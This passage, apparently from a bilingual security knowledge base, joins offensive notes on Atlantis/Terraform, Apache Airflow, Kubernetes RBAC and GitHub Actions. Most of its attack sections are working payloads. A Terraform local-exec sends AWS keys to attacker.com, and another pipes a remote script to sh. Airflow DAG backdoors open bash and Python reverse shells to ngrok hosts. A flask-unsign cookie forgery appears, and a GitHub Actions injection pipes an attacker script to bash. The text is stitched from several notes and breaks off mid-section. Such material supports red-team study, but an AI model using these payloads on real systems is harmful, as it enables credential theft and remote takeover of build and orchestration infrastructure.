"git@github.com:carlospolop/terraform_external_module_rev_shell//modules"} # 5. Atlantis plan Secrets Dump 123output "dotoken" { value = nonsensitive(var.do_token)} # 6. Atlantis apply RCE：Config modification in new PR 12345678910111213// Payload 1 to just steal a secretresource "null_resource" "secret_stealer" { provisioner "local-exec" { command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY" }}// Payload 2 to get a rev shellresource "null_resource" "rev_shell" { provisioner "local-exec" { command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'" }} # 7. Terraform Param Injection 12345atlantis plan -- <terraform commands>atlantis plan -- -h #Get terraform plan helpatlantis apply -- <terraform commands>atlantis apply -- -h #Get terraform apply help # 8. 绕过 plan/apply protections 123repos: - id: /.*/ apply_requirements: [] # 工具与参考入口 https://github.com/runatlantis/atlantis/releases The docs Webhook secrets From the docs: provide 凭据 Helm Chart AWS Fargate Module AWS EC2 Roles GCE Instance Service Accounts HashiCorp Vault Provider here the list of flags here how to transform a config option into an env var /atlantis.yml Server Side Config before after specify a new default workflow create new custom workflows conftest the docs # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/Apache Airflow Security 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Apache Airflow Security 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Apache Airflow Security 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Apache Airflow Security 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Apache Airflow Security、Basic Information、Local Lab、Docker-Compose、Minikube；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Apache Airflow Security Basic Information Local Lab Docker-Compose Minikube Airflow Configuration Airflow RBAC Attacks Web Console 枚举 Retrieve Variables Values 权限提升 DAG Backdoor (RCE in Airflow worker) DAG Backdoor (RCE in Airflow scheduler) DAG Creation DAG 代码注入 # 核心要点 Before start attacking Airflow you should understand how permissions work: Configuration (Sensitive information like the secret key and passwords might be stored here) If you have write access to the place where the DAGs are saved, you can just create one that will send you a 反弹 Shell.\ Note that this 反弹 Shell is going to be executed inside an airflow worker 容器: If you set something to be executed in the root of the code, at the moment of this writing, it will be executed by the scheduler after a couple of seconds after placing it inside the DAG's folder. When you execute a DAG from the GUI you can pass arguments to it.\ # 命令 / 载荷 / 操作片段 # 1. Minikube 1234567helm repo add airflow-stable https://airflow-helm.github.io/chartshelm repo updatehelm install airflow-release airflow-stable/airflow# Some information about how to aceess the web console will appear after this command# Use this command to delete ithelm delete airflow-release # 2. 权限提升 1flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}" # 3. DAG Backdoor (RCE in Airflow worker) 12345678910111213import pendulumfrom airflow import DAGfrom airflow.operators.bash import BashOperatorwith DAG( dag_id='rev_shell_bash', schedule_interval='0 0 * * *', start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),) as dag: run = BashOperator( task_id='run', bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433 0>&1', ) # 4. DAG Backdoor (RCE in Airflow worker) 1234567891011121314151617181920import pendulum, socket, os, ptyfrom airflow import DAGfrom airflow.operators.python import PythonOperatordef rs(rhost, port): s = socket.socket() s.connect((rhost, port)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")with DAG( dag_id='rev_shell_python', schedule_interval='0 0 * * *', start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),) as dag: run = PythonOperator( task_id='rs_python', python_callable=rs, op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433} ) # 5. DAG Backdoor (RCE in Airflow scheduler) 123456789101112131415161718192021import pendulum, socket, os, ptyfrom airflow import DAGfrom airflow.operators.python import PythonOperatordef rs(rhost, port): s = socket.socket() s.connect((rhost, port)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")rs("2.tcp.ngrok.io", 14403)with DAG( dag_id='rev_shell_python2', schedule_interval='0 0 * * *', start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),) as dag: run = PythonOperator( task_id='rs_python2', python_callable=rs, op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144} # 6. Prerequisites Building & Running BloodHound 图分析 Transformation Defensive & Offensive Considerations # 核心要点 Web Interface: This is the graphical interface where users can manage inventories, 凭据，templates, and jobs. It's designed to be intuitive and provides visualizations to help with understanding the state and results of your automation jobs. Templates: Job templates define how a particular playbook will be run, specifying the inventory, 凭据，and other parameters for the job. 凭据: AWX/Tower provides a secure way to manage and store secrets, such as SSH keys, passwords, and API tokens. These 凭据 can be associated with job templates so that playbooks have the necessary access when they run. Task Engine: This is where the magic happens. The task engine is built on Ansible and is responsible for running the playbooks. Jobs are dispatched to the task engine, which then runs the Ansible playbooks against the designated inventory using the specified 凭据. The Job Template includes references to the Inventory, Project (containing the playbook), and 凭据. The Task Engine picks up the queued job. It retrieves the necessary information from the Database about the job's associated playbook, inventory, and 凭据. Using the retrieved Ansible playbook from the associated Project, the Task Engine runs the playbook against the specified Inventory nodes using the provided 凭据. Inventories can be dynamically sourced from external systems, allowing AWX/Tower to pull in hosts from sources like AWS, Azure, VMware, and more. Following the docs it's possible to use Docker-compose to run AWX: Execute: Can run job templates within the organization. Read: Can view the organization’s resources. Read: View-only access. 关键主题 Abusing Roles/ClusterRoles in Kubernetes 权限提升 Access Any Resource or Verb (Wildcard) Access Any Resource with a specific verb Pod Create：Steal 令牌 Pod Create & Escape Stealth Pod Create：Move to cloud Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs Pods Exec port-forward Hosts Writable /var/log/ Escape Bypassing readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a> Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a> Impersonating privileged accounts Listing Secrets Creating and Reading Secrets Reading a secret – brute-forcing 令牌 IDs # 核心要点 Be able to impersonate other user/groups/SAs with better privileges within the Kubernetes cluster or to external clouds Be able to create/patch/exec pods where you can find or attach SAs with better privileges within the Kubernetes cluster or to external clouds Be able to read secrets as the SAs tokens are stored as secrets Be able to escape to the node from a 容器，where you can steal all the secrets of the containers running in the node, the 凭据 of the node, and the permissions of the node within the cloud it's running in (if any) The wildcard (*) gives permission over any resource with any verb. It's used by admins. Inside a ClusterRole this means that an attacker could abuse anynamespace in the cluster create: Grants the ability to create any cluster resource, risking 权限提升. Privileged access (disabling protections and setting capabilities) Disable namespaces hostIPC and hostPid that can help to escalate privileges Disable hostNetwork namespace, giving access to steal nodes cloud privileges and better access to networks Privileged + hostPID Privileged only pods/exec is a resource in Kubernetes used for running commands in a shell inside a pod. This allows to run commands inside the containers or get a shell inside. A laboratory and automated 利用 can be found in https://blog.aquasec.com/Kubernetes-security-pod-escape-log-mounts Direct 利用 (requires network reachability to the kubelet and a 令牌 with nodes/proxy GET): # 命令 / 载荷 / 操作片段 # 1. Access Any Resource with a specific verb 123456789apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata: name: api-resource-verbs-allrules:rules:- apiGroups: ["*"] resources: ["*"] verbs: ["create", "list", "get"] # 3. content: 来源路径： 02-知识点/云与容器/Abusing Github Actions 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Abusing Github Actions 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Abusing Github Actions 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Abusing Github Actions 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Abusing Github Actions、工具、Basic Information、Impacts Summary、GITHUB 令牌；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 29 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Abusing Github Actions 工具 Basic Information Impacts Summary GITHUB 令牌 Allowed Execution Execution from Repo Creation Execution from a New Branch Forked Execution pull request pull request target YAML-to-shell injection & metadata abuse workflow run workflow call issue comment Abusing Forked Execution Untrusted checkout execution Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a> # 核心要点 The following 工具 are useful to find Github Action workflows and even find vulnerable ones: A summary of all the impacts of an attacker managing to access a Github Action Pivoting from an already compromised repo Finally, a section about post - 利用 techniques to abuse an action from inside (cause the mentioned impacts) If you can execute arbitrary code in GitHub Actions within a repository, you may be able to: Steal secrets mounted to the pipeline and abuse the pipeline's privileges to gain unauthorized access to external platforms, such as AWS and GCP. If the pipeline deploys or stores assets, you could alter the final product, enabling a supply chain attack. Execute code in custom workers to abuse computing power and pivot to other systems. Overwrite repository code, depending on the permissions associated with the GITHUB 令牌. Recent compromises such as Nx S1ingularity and Ultralytics used 载荷 like title: "release"; curl https://attacker/sh | bash #" that get expanded in Bash before the intended script runs, letting the attacker exfiltrate npm/PyPI tokens from the privileged runner. Because the job inherits write-scoped GITHUB 令牌，artifact 凭据，and registry API keys, a single interpolation bug is enough to leak long-lived secrets or push a backdoored release. Add the malicious 载荷 to your copy Then, attacker goes back to the initial PR Dependabot opened in his fork and runs @dependabot recreate Create a new branch with the malicious shell injeciton code. # 命令 / 载荷 / 操作片段 # 1. GITHUB 令牌 1234567# Approve a PRcurl -X POST \ https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \ -H "Accept: application/vnd.github.v3+json" \ --header "authorization: Bearer $GITHUB_TOKEN" \ --header 'content-type: application/json' \ -d '{"event":"APPROVE"}' # 3. GITHUB 令牌 1234567# Create a PRcurl -X POST \ -H "Accept: application/vnd.github.v3+json" \ --header "authorization: Bearer $GITHUB_TOKEN" \ --header 'content-type: application/json' \ https://api.github.com/repos/<org_name>/<repo_name>/pulls \ -d '{"head":"<branch_name>","base":"master", "title":"title"}' # 4.
